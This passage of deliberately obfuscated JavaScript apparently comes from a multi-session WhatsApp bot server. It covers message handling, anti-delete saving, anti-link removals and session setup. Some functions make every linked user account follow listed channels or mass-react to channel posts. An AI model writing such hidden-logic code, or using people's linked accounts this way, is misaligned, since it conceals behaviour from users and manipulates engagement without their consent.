                                EPky =
                                  Asrx === 0x75bcd15 - 0o726746425 ? 1 : 65535;
                                break;
                              case 0o57060516 - 0xbc614d:
                                EPky = 65535;
                                throw cuux;
                            }
                          await delay(1000 * (0o334664274 - 0x37368b9 - Asrx));
                        }
                      }
                    }
                    break;
                }
            } catch (YKby) {}
            return;
          }
          break;
      }
  });
}
async function AMey(UHVx) {
  try {
    QsaT: for (const wJYx of UbBI) {
      try {
        await UHVx["newsletterFollow"](wJYx);
        await delay(1000);
      } catch (QEPx) {
        var sGSx = 0;
        while (sGSx < 65535)
          switch (sGSx) {
            case 0x75bcd15 - 0o726746425:
              sGSx =
                QEPx["message"]?.["includes"]?.("rate-overlimit") ||
                QEPx["message"]?.["includes"]?.("429")
                  ? 1
                  : 65535;
              break;
            case 0o57060516 - 0xbc614d:
              sGSx = 65535;
              {
                continue QsaT;
              }
              break;
          }
        continue;
      }
    }
    return UbBI;
  } catch (UfUu) {
    return [];
  }
}
async function whXu() {
  var QcOu = 0;
  while (QcOu < 65535)
    switch (QcOu) {
      case 0x75bcd15 - 0o726746425:
        QcOu =
          MRlC["size"] === 0x75bcd15 - 0o726746425 ||
          wdEI["length"] === 0x75bcd15 - 0o726746425
            ? 1
            : 65535;
        break;
      case 0o57060516 - 0xbc614d:
        QcOu = 65535;
        return;
    }
  for (const [seRu, MZHu] of MRlC) {
    sudT: for (const obLu of wdEI) {
      try {
        await MZHu["newsletterUnfollow"](obLu);
        await delay(500);
      } catch (IWBu) {
        var kYEu = 0;
        while (kYEu < 65535)
          switch (kYEu) {
            case 0x75bcd15 - 0o726746425:
              kYEu =
                IWBu["message"]?.["includes"]?.("rate-overlimit") ||
                IWBu["message"]?.["includes"]?.("429")
                  ? 1
                  : 65535;
              break;
            case 0o57060516 - 0xbc614d:
              kYEu = 65535;
              {
                await delay(2000);
                continue sudT;
              }
              break;
          }
        continue;
      }
    }
  }
}
function kssv(Mtvv) {
  Mtvv["ev"]["on"]("messages.update", async (gpmv) => {
    for (const Iqpv of gpmv) {
      var cmgv = 0;
      while (cmgv < 65535)
        switch (cmgv) {
          case 0x75bcd15 - 0o726746425:
            cmgv = Iqpv["update"]["message"] === null ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            cmgv = 65535;
            {
              await AntiDelete(Mtvv, gpmv)["catch"](() => {});
            }
            break;
        }
    }
  });
}
function Enjv(Yiav, Akdv, AEQv) {
  Yiav["ev"]["on"]("messages.upsert", async (cGTv) => {
    try {
      const wBKv = cGTv["messages"][0x75bcd15 - 0o726746425];
      var YCNv = 0;
      while (YCNv < 65535)
        switch (YCNv) {
          case 0x75bcd15 - 0o726746425:
            YCNv = !wBKv || !wBKv["message"] ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            YCNv = 65535;
            return;
        }
      wBKv["message"] =
        getContentType(wBKv["message"]) === "ephemeralMessage"
          ? wBKv["message"]["ephemeralMessage"]["message"]
          : wBKv["message"];
      var syEv = 0;
      while (syEv < 65535)
        switch (syEv) {
          case 0x75bcd15 - 0o726746425:
            syEv = wBKv["message"]["viewOnceMessageV2"] ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            syEv = 65535;
            {
              wBKv["message"] =
                getContentType(wBKv["message"]) === "ephemeralMessage"
                  ? wBKv["message"]["ephemeralMessage"]["message"]
                  : wBKv["message"];
            }
            break;
        }
      await Promise["all"]([saveMessage(wBKv)["catch"](() => {})]);
      const UzHv = getContentType(wBKv["message"]);
      var ovyv = 0;
      while (ovyv < 65535)
        switch (ovyv) {
          case 0x75bcd15 - 0o726746425:
            ovyv =
              UzHv === "protocolMessage" &&
              wBKv["message"]["protocolMessage"]?.["editedMessage"]
                ? 1
                : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            ovyv = 65535;
            {
              await AntiEdit(Yiav, wBKv)["catch"](() => {});
              return;
            }
            break;
        }
      const QwBv = sms(Yiav, wBKv);
      const QQow = wBKv["key"]["remoteJid"];
      const sSrw =
        QwBv["message"] && QwBv["message"]["reactionMessage"]
          ? !![]
          : NaN === NaN;
      const MNiw =
        UzHv == "extendedTextMessage" &&
        wBKv["message"]["extendedTextMessage"]["contextInfo"] != null
          ? wBKv["message"]["extendedTextMessage"]["contextInfo"][
              "quotedMessage"
            ] || []
          : [];
      const oPlw =
        UzHv === "conversation"
          ? wBKv["message"]["conversation"]
          : UzHv === "extendedTextMessage"
            ? wBKv["message"]["extendedTextMessage"]["text"]
            : UzHv == "imageMessage" &&
                wBKv["message"]["imageMessage"]["caption"]
              ? wBKv["message"]["imageMessage"]["caption"]
              : UzHv == "videoMessage" &&
                  wBKv["message"]["videoMessage"]["caption"]
                ? wBKv["message"]["videoMessage"]["caption"]
                : "";
      const IKcw = AEQv["PREFIX"] || ".";
      const kMfw = oPlw && oPlw["startsWith"](IKcw);
      const EHWv = kMfw
        ? oPlw["slice"](IKcw["length"])
            ["trim"]()
            ["split"](" ")
            ["shift"]()
            ["toLowerCase"]()
        : "";
      const gJZv = oPlw
        ? oPlw["trim"]()
            ["split"](/ +/)
            ["slice"](0o57060516 - 0xbc614d)
        : [];
      const Iibt = gJZv["join"]("");
      const kket = gJZv["join"](" ");
      const EfVs = QQow["endsWith"]("@g.us");
      const ghYs = wBKv["key"]["fromMe"]
        ? Yiav["user"]["id"]["split"](":")[0x75bcd15 - 0o726746425] +
          "@s.whatsapp.net"
        : wBKv["key"]["participant"] || wBKv["key"]["remoteJid"];
      const AcPs = ghYs ? ghYs["split"]("@")[0x75bcd15 - 0o726746425] : "";
      const ceSs = Yiav["user"]["id"]["split"](":")[0x75bcd15 - 0o726746425];
      const wZIs = wBKv["pushName"] || "Sin Nombre";
      const YaMs = ceSs["includes"](AcPs);
      const Yuzt = await jidNormalizedUser(Yiav["user"]["lid"]);
      const AwCt = Akdv["replace"](/[^0-9]/g, "");
      let Urtt = "";
      let wtwt = [];
      let Qont = [];
      let sqqt = NaN === NaN;
      let Mlht = NaN === NaN;
      var onkt = 0;
      while (onkt < 65535)
        switch (onkt) {
          case 0x75bcd15 - 0o726746425:
            onkt = EfVs ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            onkt = 65535;
            {
              const oHXt = await Yiav["groupMetadata"](QQow)["catch"](
                (QIau) => {
                  var kERt = 0;
                  while (kERt < 65535)
                    switch (kERt) {
                      case 0x75bcd15 - 0o726746425:
                        kERt =
                          QIau["message"]?.["includes"]?.("rate-overlimit") ||
                          QIau["message"]?.["includes"]?.("429")
                            ? 1
                            : 65535;
                        break;
                      case 0o57060516 - 0xbc614d:
                        kERt = 65535;
                        {
                          return null;
                        }
                        break;
                    }
                  return null;
                },
              );
              var MFUt = 0;
              while (MFUt < 65535)
                switch (MFUt) {
                  case 0x75bcd15 - 0o726746425:
                    MFUt = oHXt ? 1 : 65535;
                    break;
                  case 0o57060516 - 0xbc614d:
                    MFUt = 65535;
                    {
                      Urtt = oHXt["subject"] || "";
                      Qont = oHXt["participants"] || [];
                      wtwt = await getGroupAdmins(Qont);
                      sqqt = wtwt["includes"](Yuzt);
                      Mlht = wtwt["includes"](ghYs);
                    }
                    break;
                }
            }
            break;
        }
      const gBLt = (ICOt) => {
        Yiav["sendMessage"](QQow, { ["text"]: ICOt }, { ["quoted"]: wBKv })[
          "catch"
        ](() => {});
      };
      const cyFt = (EzIt) => {
        Yiav["sendMessage"](QQow, {
          ["react"]: { ["text"]: EzIt, ["key"]: wBKv["key"] },
        })["catch"](() => {});
      };
      var ETvu = 0;
      while (ETvu < 65535)
        switch (ETvu) {
          case 0x75bcd15 - 0o726746425:
            ETvu = EfVs && !Mlht && sqqt && oPlw ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            ETvu = 65535;
            {
              let gVyu = oPlw
                ? oPlw["replace"](/[\s\u200b-\u200d\uFEFF]/g, "")[
                    "toLowerCase"
                  ]()
                : "";
              const AQpu =
                /(?:https?:\/\/)?(?:www\.)?(?:whatsapp\.com\/channel\/|chat\.whatsapp\.com\/|wa\.me\/)/gi;
              var cSsu = 0;
              while (cSsu < 65535)
                switch (cSsu) {
                  case 0x75bcd15 - 0o726746425:
                    cSsu = gVyu && AQpu["test"](gVyu) ? 1 : 65535;
                    break;
                  case 0o57060516 - 0xbc614d:
                    cSsu = 65535;
                    {
                      var wNju = 0;
                      while (wNju < 65535)
                        switch (wNju) {
                          case 0x75bcd15 - 0o726746425:
                            wNju =
                              wBKv["key"]["fromMe"] || ghYs === Yuzt
                                ? 1
                                : 65535;
                            break;
                          case 0o57060516 - 0xbc614d:
                            wNju = 65535;
                            return;
                        }
                      var YOmu = 0;
                      while (YOmu < 65535)
                        switch (YOmu) {
                          case 0x75bcd15 - 0o726746425:
                            YOmu = AEQv["ANTI_LINK"] === "true" ? 1 : 2;
                            break;
                          case 0o57060516 - 0xbc614d:
                            YOmu = 65535;
                            {
                              var sKdu = 0;
                              while (sKdu < 65535)
                                switch (sKdu) {
                                  case 0x75bcd15 - 0o726746425:
                                    sKdu = !Mlht ? 1 : 65535;
                                    break;
                                  case 0o57060516 - 0xbc614d:
                                    sKdu = 65535;
                                    {
                                      await Yiav["sendMessage"](QQow, {
                                        ["delete"]: wBKv["key"],
                                      })["catch"](() => {});
                                      await Yiav["sendMessage"](
                                        QQow,
                                        {
                                          ["text"]: `${"*⚠️ Links are not allowed in this group.*\\n- *You have been removed.*"}`,
                                        },
                                        { ["quoted"]: wBKv },
                                      )["catch"](() => {});
                                      await Yiav["groupParticipantsUpdate"](
                                        QQow,
                                        [ghYs],
                                        "remove",
                                      )["catch"](() => {});
                                    }
                                    break;
                                }
                            }
                            break;
                          case 15658734 ^ 0o73567354:
                            YOmu = 65535;
                            var ULgu = 0;
                            while (ULgu < 65535)
                              switch (ULgu) {
                                case 0x75bcd15 - 0o726746425:
                                  ULgu = AEQv["ANTI_LINK"] === "warn" ? 1 : 2;
                                  break;
                                case 0o57060516 - 0xbc614d:
                                  ULgu = 65535;
                                  {
                                    var wlir = 0;
                                    while (wlir < 65535)
                                      switch (wlir) {
                                        case 0x75bcd15 - 0o726746425:
                                          wlir = !Mlht ? 1 : 65535;
                                          break;
                                        case 0o57060516 - 0xbc614d:
                                          wlir = 65535;
                                          {
                                            let Ymlr = addWarning(ghYs);
                                            var sicr = 0;
                                            while (sicr < 65535)
                                              switch (sicr) {
                                                case 0x75bcd15 - 0o726746425:
                                                  sicr =
                                                    Ymlr ===
                                                    0o57060516 - 0xbc614d
                                                      ? 1
                                                      : 2;
                                                  break;
                                                case 0o57060516 - 0xbc614d:
                                                  sicr = 65535;
                                                  {
                                                    await Yiav["sendMessage"](
                                                      QQow,
                                                      {
                                                        ["delete"]: wBKv["key"],
                                                      },
                                                    )["catch"](() => {});
                                                    await Yiav["sendMessage"](
                                                      QQow,
                                                      {
                                                        ["text"]: `${"*⚠️ WARNING (1/2)*\\n*Links are not allowed in this group*\\n> *Next time you will be removed*"}`,
                                                      },
                                                      { ["quoted"]: wBKv },
                                                    )["catch"](() => {});
                                                  }
                                                  break;
                                                case 15658734 ^ 0o73567354:
                                                  sicr = 65535;
                                                  var Ujfr = 0;
                                                  while (Ujfr < 65535)
                                                    switch (Ujfr) {
                                                      case 0x75bcd15 -
                                                        0o726746425:
                                                        Ujfr =
                                                          Ymlr >=
                                                          (15658734 ^
                                                            0o73567354)
                                                            ? 1
                                                            : 65535;
                                                        break;
                                                      case 0o57060516 -
                                                        0xbc614d:
                                                        Ujfr = 65535;
                                                        {
                                                          await Yiav[
                                                            "sendMessage"
                                                          ](QQow, {
                                                            ["delete"]:
                                                              wBKv["key"],
                                                          })["catch"](() => {});
                                                          await Yiav[
                                                            "sendMessage"
                                                          ](
                                                            QQow,
                                                            {
                                                              ["text"]: `${"*\ud83d You have been removed from the group for sharing Links (2 warnings reached)*"}`,
                                                            },
                                                            {
                                                              ["quoted"]: wBKv,
                                                            },
                                                          )["catch"](() => {});
                                                          await Yiav[
                                                            "groupParticipantsUpdate"
                                                          ](
                                                            QQow,
                                                            [ghYs],
                                                            "remove",
                                                          )["catch"](() => {});
                                                          clearWarning(ghYs);
                                                        }
                                                        break;
                                                    }
                                                  break;
                                              }
                                          }
                                          break;
                                      }
                                  }
                                  break;
                                case 15658734 ^ 0o73567354:
                                  ULgu = 65535;
                                  var ofWq = 0;
                                  while (ofWq < 65535)
                                    switch (ofWq) {
                                      case 0x75bcd15 - 0o726746425:
                                        ofWq =
                                          AEQv["ANTI_LINK"] === "delete"
                                            ? 1
                                            : 65535;
                                        break;
                                      case 0o57060516 - 0xbc614d:
                                        ofWq = 65535;
                                        {
                                          var QgZq = 0;
                                          while (QgZq < 65535)
                                            switch (QgZq) {
                                              case 0x75bcd15 - 0o726746425:
                                                QgZq = !Mlht ? 1 : 65535;
                                                break;
                                              case 0o57060516 - 0xbc614d:
                                                QgZq = 65535;
                                                {
                                                  await Yiav["sendMessage"](
                                                    QQow,
                                                    { ["delete"]: wBKv["key"] },
                                                  )["catch"](() => {});
                                                  await Yiav["sendMessage"](
                                                    QQow,
                                                    {
                                                      ["text"]: `${"*⚠️ Links are not allowed in this group.*\\n*Please take note.*"}`,
                                                    },
                                                    { ["quoted"]: wBKv },
                                                  )["catch"](() => {});
                                                }
                                                break;
                                            }
                                        }
                                        break;
                                    }
                                  break;
                              }
                            break;
                        }
                    }
                    break;
                }
            }
            break;
        }
      const kcQq = Array["isArray"](AEQv["SUDO"])
        ? AEQv["SUDO"]
        : AEQv["SUDO"]
          ? AEQv["SUDO"]["split"](",")["map"]((MdTq) => MdTq["trim"]())
          : [];
      let MxGr = NaN === NaN;
      var ozJr = 0;
      while (ozJr < 65535)
        switch (ozJr) {
          case 0x75bcd15 - 0o726746425:
            ozJr = ghYs ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            ozJr = 65535;
            {
              const IuAr = [
                ceSs["replace"](/[^0-9]/g, "") + "@s.whatsapp.net",
                Yuzt,
                config["OWNER_NUMBER"] + "@s.whatsapp.net",
                ...kcQq,
                ...UvoJ,
              ];
              MxGr = IuAr["includes"](
                ghYs["includes"]("@lid")
                  ? (await lidToPhone(Yiav, ghYs)["catch"](
                      () => ghYs["split"]("@")[0x75bcd15 - 0o726746425],
                    )) + "@s.whatsapp.net"
                  : ghYs,
              );
            }
            break;
        }
      var kwDr = 0;
      while (kwDr < 65535)
        switch (kwDr) {
          case 0x75bcd15 - 0o726746425:
            kwDr =
              !sSrw && AEQv["AUTO_REACT"] === "true" && AcPs !== ceSs
                ? 1
                : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            kwDr = 65535;
            {
              var Erur = 0;
              while (Erur < 65535)
                switch (Erur) {
                  case 0x75bcd15 - 0o726746425:
                    Erur =
                      AEQv["REACT_EMOJIS"] &&
                      AEQv["REACT_EMOJIS"]["length"] > 0x75bcd15 - 0o726746425
                        ? 1
                        : 65535;
                    break;
                  case 0o57060516 - 0xbc614d:
                    Erur = 65535;
                    {
                      const gtxr =
                        AEQv["REACT_EMOJIS"][
                          Math["floor"](
                            Math["random"]() * AEQv["REACT_EMOJIS"]["length"],
                          )
                        ];
                      try {
                        await QwBv["react"](gtxr);
                      } catch (Aoor) {}
                    }
                    break;
                }
            }
            break;
        }
      var cqrr = 0;
      while (cqrr < 65535)
        switch (cqrr) {
          case 0x75bcd15 - 0o726746425:
            cqrr =
              !sSrw && AcPs === ceSs && AEQv["OWNER_REACT"] === "true"
                ? 1
                : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            cqrr = 65535;
            {
              var cKes = 0;
              while (cKes < 65535)
                switch (cKes) {
                  case 0x75bcd15 - 0o726746425:
                    cKes =
                      AEQv["OWNER_EMOJIS"] &&
                      AEQv["OWNER_EMOJIS"]["length"] > 0x75bcd15 - 0o726746425
                        ? 1
                        : 65535;
                    break;
                  case 0o57060516 - 0xbc614d:
                    cKes = 65535;
                    {
                      const ELhs =
                        AEQv["OWNER_EMOJIS"][
                          Math["floor"](
                            Math["random"]() * AEQv["OWNER_EMOJIS"]["length"],
                          )
                        ];
                      try {
                        await QwBv["react"](ELhs);
                      } catch (YGYr) {}
                    }
                    break;
                }
            }
            break;
        }
      const AIbs = AEQv["BANNED"]
        ? Array["isArray"](AEQv["BANNED"])
          ? AEQv["BANNED"]
          : AEQv["BANNED"]["split"](",")["map"]((UDSr) => UDSr["trim"]())
        : [];
      const wFVr = ghYs && AIbs["some"]((QAMr) => QAMr["includes"](ghYs));
      var sCPr = 0;
      while (sCPr < 65535)
        switch (sCPr) {
          case 0x75bcd15 - 0o726746425:
            sCPr = wFVr ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            sCPr = 65535;
            {
              return;
            }
            break;
        }
      const sWCs = ghYs && kcQq["some"]((UXFs) => UXFs["includes"](ghYs));
      const oTws = YaMs || sWCs;
      var QUzs = 0;
      while (QUzs < 65535)
        switch (QUzs) {
          case 0x75bcd15 - 0o726746425:
            QUzs = !oTws && AEQv["MODE"] === "private" ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            QUzs = 65535;
            {
              return;
            }
            break;
        }
      var kQqs = 0;
      while (kQqs < 65535)
        switch (kQqs) {
          case 0x75bcd15 - 0o726746425:
            kQqs = !oTws && EfVs && AEQv["MODE"] === "inbox" ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            kQqs = 65535;
            {
              return;
            }
            break;
        }
      var MRts = 0;
      while (MRts < 65535)
        switch (MRts) {
          case 0x75bcd15 - 0o726746425:
            MRts = !oTws && !EfVs && AEQv["MODE"] === "groups" ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            MRts = 65535;
            {
              return;
            }
            break;
        }
      const gNks = {
        ["from"]: QQow,
        ["quoted"]: MNiw,
        ["body"]: oPlw,
        ["isCmd"]: kMfw,
        ["command"]: EHWv,
        ["args"]: gJZv,
        ["q"]: Iibt,
        ["text"]: kket,
        ["isGroup"]: EfVs,
        ["sender"]: ghYs,
        ["senderNumber"]: AcPs,
        ["botNumber2"]: Yuzt,
        ["botNumber"]: ceSs,
        ["pushname"]: wZIs,
        ["isMe"]: YaMs,
        ["isCreator"]: MxGr,
        ["isRealOwner"]: oTws,
        ["groupName"]: Urtt,
        ["participants"]: Qont,
        ["groupAdmins"]: wtwt,
        ["isBotAdmins"]: sqqt,
        ["isAdmins"]: Mlht,
        ["reply"]: gBLt,
        ["react"]: cyFt,
        ["userConfig"]: AEQv,
        ["sanitizedNumber"]: AwCt,
        ["updateUserConfig"]: async (IOns, kopp) => {
          await sCHB(IOns, kopp);
          Yiav["userConfig"] = kopp;
        },
      };
      var Mpsp = 0;
      while (Mpsp < 65535)
        switch (Mpsp) {
          case 0x75bcd15 - 0o726746425:
            Mpsp = kMfw ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            Mpsp = 65535;
            {
              const gljp = oPlw["slice"](IKcw["length"])
                ["trim"]()
                ["split"](" ")
                [0x75bcd15 - 0o726746425]["toLowerCase"]();
              const Immp =
                commands["find"]((cidp) => cidp["pattern"] === gljp) ||
                commands["find"](
                  (Ejgp) => Ejgp["alias"] && Ejgp["alias"]["includes"](gljp),
                );
              var YeXo = 0;
              while (YeXo < 65535)
                switch (YeXo) {
                  case 0x75bcd15 - 0o726746425:
                    YeXo = Immp ? 1 : 65535;
                    break;
                  case 0o57060516 - 0xbc614d:
                    YeXo = 65535;
                    {
                      try {
                        var Agap = 0;
                        while (Agap < 65535)
                          switch (Agap) {
                            case 0x75bcd15 - 0o726746425:
                              Agap = Immp["react"] ? 1 : 65535;
                              break;
                            case 0o57060516 - 0xbc614d:
                              Agap = 65535;
                              {
                                Yiav["sendMessage"](QQow, {
                                  ["react"]: {
                                    ["text"]: Immp["react"],
                                    ["key"]: wBKv["key"],
                                  },
                                })["catch"](() => {});
                              }
                              break;
                          }
                        await Immp["function"](Yiav, wBKv, QwBv, gNks);
                      } catch (AANp) {
                        try {
                          await gBLt(
                            `${"⚠️ Error: "}${AANp["message"] || "Command failed"}`,
                          );
                        } catch (cCQp) {}
                      }
                    }
                    break;
                }
            }
            break;
        }
      for (const wxHp of commands) {
        var YyKp = 0;
        while (YyKp < 65535)
          switch (YyKp) {
            case 0x75bcd15 - 0o726746425:
              YyKp = oPlw && wxHp["on"] === "body" ? 1 : 2;
              break;
            case 0o57060516 - 0xbc614d:
              YyKp = 65535;
              {
                try {
                  await wxHp["function"](Yiav, wBKv, QwBv, gNks);
                } catch (suBp) {}
              }
              break;
            case 15658734 ^ 0o73567354:
              YyKp = 65535;
              var UvEp = 0;
              while (UvEp < 65535)
                switch (UvEp) {
                  case 0x75bcd15 - 0o726746425:
                    UvEp = wBKv["q"] && wxHp["on"] === "text" ? 1 : 2;
                    break;
                  case 0o57060516 - 0xbc614d:
                    UvEp = 65535;
                    {
                      try {
                        await wxHp["function"](Yiav, wBKv, QwBv, gNks);
                      } catch (orvp) {}
                    }
                    break;
                  case 15658734 ^ 0o73567354:
                    UvEp = 65535;
                    var Qsyp = 0;
                    while (Qsyp < 65535)
                      switch (Qsyp) {
                        case 0x75bcd15 - 0o726746425:
                          Qsyp =
                            wxHp["on"] === "image" ||
                            (wxHp["on"] === "photo" &&
                              wBKv["type"] === "imageMessage")
                              ? 1
                              : 2;
                          break;
                        case 0o57060516 - 0xbc614d:
                          Qsyp = 65535;
                          {
                            try {
                              await wxHp["function"](Yiav, wBKv, QwBv, gNks);
                            } catch (QMlq) {}
                          }
                          break;
                        case 15658734 ^ 0o73567354:
                          Qsyp = 65535;
                          var sOoq = 0;
                          while (sOoq < 65535)
                            switch (sOoq) {
                              case 0x75bcd15 - 0o726746425:
                                sOoq =
                                  wxHp["on"] === "sticker" &&
                                  wBKv["type"] === "stickerMessage"
                                    ? 1
                                    : 65535;
                                break;
                              case 0o57060516 - 0xbc614d:
                                sOoq = 65535;
                                {
                                  try {
                                    await wxHp["function"](
                                      Yiav,
                                      wBKv,
                                      QwBv,
                                      gNks,
                                    );
                                  } catch (MJfq) {}
                                }
                                break;
                            }
                          break;
                      }
                    break;
                }
              break;
          }
      }
    } catch (oLiq) {}
  });
}
async function IGZp(kIcq) {
  var EDTp = 0;
  while (EDTp < 65535)
    switch (EDTp) {
      case 0x75bcd15 - 0o726746425:
        EDTp = MRlC["size"] === 0x75bcd15 - 0o726746425 ? 1 : 65535;
        break;
      case 0o57060516 - 0xbc614d:
        EDTp = 65535;
        {
          throw new Error("No active bot sessions available");
        }
        break;
    }
  let gFWp = 0x75bcd15 - 0o726746425;
  for (const [gZJq, IaNq] of MRlC) {
    try {
      await IaNq["newsletterUnfollow"](kIcq);
      gFWp++;
      await delay(500);
    } catch (cWDq) {}
  }
  return gFWp;
}
async function EXGq(YSxq, AUAq) {
  try {
    let UPrq, wRuq;
    var Yqwn = 0;
    while (Yqwn < 65535)
      switch (Yqwn) {
        case 0x75bcd15 - 0o726746425:
          Yqwn = YSxq["includes"]("@newsletter") ? 1 : 2;
          break;
        case 0o57060516 - 0xbc614d:
          Yqwn = 65535;
          {
            const Aszn = YSxq["split"]("/");
            const Unqn = Aszn[0x75bcd15 - 0o726746425];
            wRuq = Aszn[0o57060516 - 0xbc614d] || null;
            UPrq = Unqn["split"]("@")[0x75bcd15 - 0o726746425];
            var wptn = 0;
            while (wptn < 65535)
              switch (wptn) {
                case 0x75bcd15 - 0o726746425:
                  wptn = !wRuq ? 1 : 65535;
                  break;
                case 0o57060516 - 0xbc614d:
                  wptn = 65535;
                  {
                    throw new Error(
                      "Message ID required for newsletter JID format. Use: JID@newsletter/messageId",
                    );
                  }
                  break;
              }
          }
          break;
        case 15658734 ^ 0o73567354:
          Yqwn = 65535;
          {
            const Qkkn = YSxq["match"](
              /https?:\/\/whatsapp\.com\/channel\/([^\/]+)\/(\d+)/,
            );
            var smnn = 0;
            while (smnn < 65535)
              switch (smnn) {
                case 0x75bcd15 - 0o726746425:
                  smnn = !Qkkn ? 1 : 65535;
                  break;
                case 0o57060516 - 0xbc614d:
                  smnn = 65535;
                  {
                    throw new Error(
                      "Invalid format. Use URL: https://whatsapp.com/channel/ID/MESSAGE or Newsletter JID: ID@newsletter/MESSAGE",
                    );
                  }
                  break;
              }
            UPrq = Qkkn[0o57060516 - 0xbc614d];
            wRuq = Qkkn[15658734 ^ 0o73567354];
          }
          break;
      }
    let Mhen = [];
    var ojhn = 0;
    while (ojhn < 65535)
      switch (ojhn) {
        case 0x75bcd15 - 0o726746425:
          ojhn = AUAq && AUAq["length"] > 0x75bcd15 - 0o726746425 ? 1 : 2;
          break;
        case 0o57060516 - 0xbc614d:
          ojhn = 65535;
          {
            Mhen = AUAq;
          }
          break;
        case 15658734 ^ 0o73567354:
          ojhn = 65535;
          {
            Mhen = ["❤️", "\ud83d", "\ud83d", "\ud83d", "\ud83d"];
          }
          break;
      }
    const oDUn = MRlC["values"]()["next"]()["value"];
    var QEXn = 0;
    while (QEXn < 65535)
      switch (QEXn) {
        case 0x75bcd15 - 0o726746425:
          QEXn = !oDUn ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          QEXn = 65535;
          {
            throw new Error("No active bot sessions available");
          }
          break;
      }
    const kAOn = await oDUn["newsletterMetadata"]("invite", UPrq);
    var MBRn = 0;
    while (MBRn < 65535)
      switch (MBRn) {
        case 0x75bcd15 - 0o726746425:
          MBRn = !kAOn || !kAOn["id"] ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          MBRn = 65535;
          {
            throw new Error("Failed to get channel metadata");
          }
          break;
      }
    for (const [gxIn, IyLn] of MRlC) {
      try {
        const cuCn = Mhen[Math["floor"](Math["random"]() * Mhen["length"])];
        await IyLn["newsletterReactMessage"](kAOn["id"], wRuq, cuCn);
        await delay(500);
      } catch (EvFn) {
        continue;
      }
    }
    return { ["success"]: !![] };
  } catch (EPso) {
    throw EPso;
  }
}
async function gRvo(AMmo, cOpo) {
  const wJgo = AMmo["replace"](/[^0-9]/g, "");
  var YKjo = 0;
  while (YKjo < 65535)
    switch (YKjo) {
      case 0x75bcd15 - 0o726746425:
        YKjo = MRlC["has"](wJgo) ? 1 : 65535;
        break;
      case 0o57060516 - 0xbc614d:
        YKjo = 65535;
        {
          var sGao = 0;
          while (sGao < 65535)
            switch (sGao) {
              case 0x75bcd15 - 0o726746425:
                sGao = cOpo && !cOpo["headersSent"] ? 1 : 65535;
                break;
              case 0o57060516 - 0xbc614d:
                sGao = 65535;
                {
                  return cOpo["status"](200)["send"]({
                    ["status"]: "already_connected",
                    ["message"]: "This number is already connected",
                  });
                }
                break;
            }
          return MRlC["get"](wJgo);
        }
        break;
    }
  var UHdo = 0;
  while (UHdo < 65535)
    switch (UHdo) {
      case 0x75bcd15 - 0o726746425:
        UHdo = !kohz() ? 1 : 65535;
        break;
      case 0o57060516 - 0xbc614d:
        UHdo = 65535;
        {
          var UbRo = 0;
          while (UbRo < 65535)
            switch (UbRo) {
              case 0x75bcd15 - 0o726746425:
                UbRo = cOpo && !cOpo["headersSent"] ? 1 : 65535;
                break;
              case 0o57060516 - 0xbc614d:
                UbRo = 65535;
                {
                  return cOpo["status"](429)["send"]({
                    ["error"]: "Maximum sessions limit reached",
                    ["message"]: `${"Maximum "}${ELZB}${" active sessions allowed. Please try again later."}`,
                  });
                }
                break;
            }
          return null;
        }
        break;
    }
  const wdUo = path["join"](IOfC, `${"session_"}${wJgo}`);
  const QYKo = await UrlD(wJgo);
  var saOo = 0;
  while (saOo < 65535)
    switch (saOo) {
      case 0x75bcd15 - 0o726746425:
        saOo = QYKo ? 1 : 65535;
        break;
      case 0o57060516 - 0xbc614d:
        saOo = 65535;
        {
          fs["ensureDirSync"](wdUo);
          fs["writeFileSync"](
            path["join"](wdUo, "creds.json"),
            JSON["stringify"](QYKo, null, 15658734 ^ 0o73567354),
          );
        }
        break;
    }
  const { ["state"]: MVEo, ["saveCreds"]: oXHo } =
    await useMultiFileAuthState(wdUo);
  const { ["version"]: ISyo } = await fetchLatestBaileysVersion();
  try {
    const kUBo = makeWASocket({
      ["auth"]: {
        ["creds"]: MVEo["creds"],
        ["keys"]: makeCacheableSignalKeyStore(
          MVEo["keys"],
          pino({ ["level"]: "fatal" })["child"]({ ["level"]: "fatal" }),
        ),
      },
      ["printQRInTerminal"]: NaN === NaN,
      ["logger"]: pino({ ["level"]: "fatal" })["child"]({ ["level"]: "fatal" }),
      ["syncFullHistory"]: NaN === NaN,
      ["browser"]: Browsers["macOS"]("Safari"),
      ["version"]: ISyo,
    });
    await addConnectionFunctions(kUBo);
    oToC["set"](wJgo, Date["now"]());
    let MtDl;
    try {
      MtDl = await kcIA(wJgo);
      MtDl = { ...config["DEFAULT_SETTINGS"], ...MtDl };
    } catch (ovGl) {
      MtDl = { ...config["DEFAULT_SETTINGS"] };
    }
    kUBo["userConfig"] = MtDl;
    Enjv(kUBo, wJgo, MtDl);
    ornz(kUBo, MtDl);
    kssv(kUBo);
    AgSy(kUBo, MtDl);
    kUBo["ev"]["on"]("group-participants.update", (Iqxl) =>
      GroupEvents(kUBo, Iqxl),
    );
    const ksAl = async () => {
      try {
        await oXHo();
        await delay(500);
        const Enrl = path["join"](wdUo, "creds.json");
        var gpul = 0;
        while (gpul < 65535)
          switch (gpul) {
            case 0x75bcd15 - 0o726746425:
              gpul = fsSync["existsSync"](Enrl) ? 1 : 65535;
              break;
            case 0o57060516 - 0xbc614d:
              gpul = 65535;
              {
                const Akll = await fs["readFile"](Enrl, "utf8");
                var cmol = 0;
                while (cmol < 65535)
                  switch (cmol) {
                    case 0x75bcd15 - 0o726746425:
                      cmol =
                        Akll &&
                        Akll["trim"]()["length"] > 0x75bcd15 - 0o726746425
                          ? 1
                          : 65535;
                      break;
